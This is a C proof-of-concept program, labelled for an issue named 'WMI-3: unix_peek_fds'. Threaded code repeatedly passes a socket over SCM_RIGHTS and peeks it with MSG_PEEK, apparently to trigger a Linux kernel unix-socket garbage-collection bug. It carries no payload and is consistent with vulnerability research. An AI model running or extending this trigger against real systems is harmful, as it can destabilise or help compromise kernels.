/*
 * PoC for WMI-3: unix_peek_fds
 * Send a socket via SCM_RIGHTS, then peek.
 * A socket in flight has special GC semantics.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <errno.h>
#include <pthread.h>

int sv[2];
int fd_to_send;

void *sender_thread(void *arg)
{
    struct msghdr msg;
    struct iovec iov;
    char buf[64];
    char cmsg_buf[CMSG_SPACE(sizeof(int))];
    struct cmsghdr *cmsg;
    int ret;
    int i;

    for (i = 0; i < 100; i++) {
        memset(&msg, 0, sizeof(msg));
        memset(buf, 0x41, sizeof(buf));
        iov.iov_base = buf;
        iov.iov_len = sizeof(buf);
        msg.msg_name = NULL;
        msg.msg_namelen = 0;
        msg.msg_iov = &iov;
        msg.msg_iovlen = 1;
        msg.msg_control = cmsg_buf;
        msg.msg_controllen = sizeof(cmsg_buf);
        cmsg = CMSG_FIRSTHDR(&msg);
        cmsg->cmsg_level = SOL_SOCKET;
        cmsg->cmsg_type = SCM_RIGHTS;
        cmsg->cmsg_len = CMSG_LEN(sizeof(int));
        *(int *)CMSG_DATA(cmsg) = fd_to_send;

        ret = sendmsg(sv[0], &msg, 0);
        if (ret < 0) {
            perror("sendmsg");
            return NULL;
        }
    }
    printf("Sender: sent 100 messages\n");
    return NULL;
}

void *receiver_thread(void *arg)
{
    struct msghdr msg;
    struct iovec iov;
    char buf[64];
    char cmsg_buf[CMSG_SPACE(sizeof(int))];
    struct cmsghdr *cmsg;
    int ret;
    int i;

    for (i = 0; i < 100; i++) {
        /* Peek */
        memset(&msg, 0, sizeof(msg));
        memset(cmsg_buf, 0, sizeof(cmsg_buf));
        memset(buf, 0, sizeof(buf));
        iov.iov_base = buf;
        iov.iov_len = sizeof(buf);
        msg.msg_iov = &iov;
        msg.msg_iovlen = 1;
        msg.msg_control = cmsg_buf;
        msg.msg_controllen = sizeof(cmsg_buf);

        ret = recvmsg(sv[1], &msg, MSG_PEEK);
        if (ret < 0) {
            perror("recvmsg (peek)");
            return NULL;
        }

        /* Consume */
        memset(&msg, 0, sizeof(msg));
        memset(cmsg_buf, 0, sizeof(cmsg_buf));
        memset(buf, 0, sizeof(buf));
        iov.iov_base = buf;
        iov.iov_len = sizeof(buf);
        msg.msg_iov = &iov;
        msg.msg_iovlen = 1;
        msg.msg_control = cmsg_buf;
        msg.msg_controllen = sizeof(cmsg_buf);

        ret = recvmsg(sv[1], &msg, 0);
        if (ret < 0) {
            perror("recvmsg (consume)");
            return NULL;
        }

        /* Close received fd */
        cmsg = CMSG_FIRSTHDR(&msg);
        if (cmsg && cmsg->cmsg_level == SOL_SOCKET && cmsg->cmsg_type == SCM_RIGHTS) {
            int received_fd = *(int *)CMSG_DATA(cmsg);
            if (received_fd >= 0)
                close(received_fd);
        }
    }
    printf("Receiver: peeked and consumed 100 messages\n");
    return NULL;
}

int main(int argc, char *argv[])
{
    pthread_t snd, rcv;
    int ret;
    int pair[2];

    /* Create a DGRAM socket pair for communication */
    if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sv) < 0) {
        perror("socketpair");
        return 1;
    }

    /* Create a socket to send as SCM_RIGHTS */
    if (socketpair(AF_UNIX, SOCK_DGRAM, 0, pair) < 0) {
        perror("socketpair for sending");
        return 1;
    }
    fd_to_send = pair[0]; /* Send one end of the socket pair */

    /* Create sender and receiver threads */
    ret = pthread_create(&snd, NULL, sender_thread, NULL);
    if (ret) {
        perror("pthread_create sender");
        return 1;
    }
    ret = pthread_create(&rcv, NULL, receiver_thread, NULL);
    if (ret) {
        perror("pthread_create receiver");
        return 1;
    }

    pthread_join(snd, NULL);
    pthread_join(rcv, NULL);

    close(pair[0]);
    close(pair[1]);
    close(sv[0]);
    close(sv[1]);

    printf("PoC completed\n");
    return 0;
}
